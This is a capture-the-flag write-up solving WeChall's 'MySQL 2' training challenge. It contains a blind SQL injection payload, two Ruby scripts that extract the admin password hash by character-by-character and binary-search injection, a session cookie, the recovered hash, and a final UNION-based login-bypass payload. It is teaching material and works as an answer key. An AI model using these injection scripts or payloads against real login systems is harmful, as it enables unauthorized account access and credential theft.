# [Training: MySQL 2](https://www.wechall.net/challenge/training/mysql/auth_bypass2/index.php)

This time the query is only looking for username and returning the password so that it 
can be checked later in the code. So we can't just ignore the password check. We need to 
get the password for admin.

We can test usernames for existence though. So we can come up with some trickery to leak the 
password character by character. This is best done with a script. But first let's find the 
length of the password.

After some digging we find that the length of the password is 32:

`admin' and length(password)=32-- ` returns "Wrong Password" instead of "username unknown"

So now we need to script this and bruteforce a 32 character password using the same 
exfiltration technique.

So this script took 27 minutes and got us the password.

```ruby
require 'net/http'

allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
pass = ""
32.times do |i|
  allChars.split("").each do |c|
    puts "Password(#{i+1}/32): #{pass}"
    url = "https://www.wechall.net/challenge/training/mysql/auth_bypass2/index.php"
    injection = "username=admin%27+and+substr%28password,1,#{pass.length+1}%29%3D%27#{pass+c}%27--+&password=&login=Login"
    req = `curl "#{url}" -X POST -H 'Cookie: WC=11505220-47569-RrANtBqpJ6O7bYfl' --data '#{injection}'`

    unless req.include? "username is unknown"
      pass += c
      break
    end
    system('clear')
  end
end


puts "Password for admin: #{pass}"
```

But that's literally trying every single character... We can improve 
the speed of this thing using `>` comparison instead of `=` which will 
speed up our script up to 10x.

This script took only 5 minutes!

```ruby
require 'net/http'

allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".chars.sort
pass = ""
url = "https://www.wechall.net/challenge/training/mysql/auth_bypass2/index.php"

32.times do |i|
  charset = allChars
  while charset.length > 1
    curr = (charset.length - 1) /2
    char = charset[curr]
    puts "Password(#{i+1}/32): #{pass}, Testing: #{char}"
    injection = "username=admin%27+and+substr%28password,1,#{pass.length+1}%29"
    # %3E >
    # check if current password substring > pass + char
    injection += "%3E%27#{pass+char}%27--+&password=&login=Login"
    req = `curl "#{url}" -X POST -H 'Cookie: WC=11505220-47569-RrANtBqpJ6O7bYfl' --data '#{injection}'`

    if req.include? "username is unknown" # substring is less than or equal
      charset = charset[0..curr]
    else
      charset = charset[(curr+1)..-1]
    end

    system('clear')
  end
  pass += charset[0]
end

puts "Password for admin: #{pass}"
```

You could easily do this same type of brute forcing with tools like 
Burp or Hydra but wasn't scripting our own more fun?

Password is: **b705c94300b6fcbccfae2bb65937fee3**

Too bad the password is an MD5 hash and is apparently pretty strong b/c 
initial attempts to crack it were futile.

So there's got to be a way to do this without actually knowing the admin 
password. Let's look at the source again...

We execute the query: `SELECT * FROM users WHERE username='$username'`

We then check if `$result['password'] !== $password`

We then check if `$result['username'] === 'admin'`

So as long as we return a row that "looks" like it's the admin we could 
use any password we want. For example what if we could force the query 
to return this result:

userid|username|password  
null  |admin   |d6a6bc0db10694a2d90e3a69648f3a03

Where "d6a6bc0db10694a2d90e3a69648f3a03" is the MD5 hash of 'hacker'

Well imagine what this input would do:

`' union select null,'admin','password'-- `

It would be put into our query and return a single row.

userid|username|password  
null  |admin   |password

So we can just use this concept to pass our own MD5 hash:

`' union select null,'admin','d6a6bc0db10694a2d90e3a69648f3a03'-- `

And then put "hacker" in the password box. And boom! We're admin!

Solved.
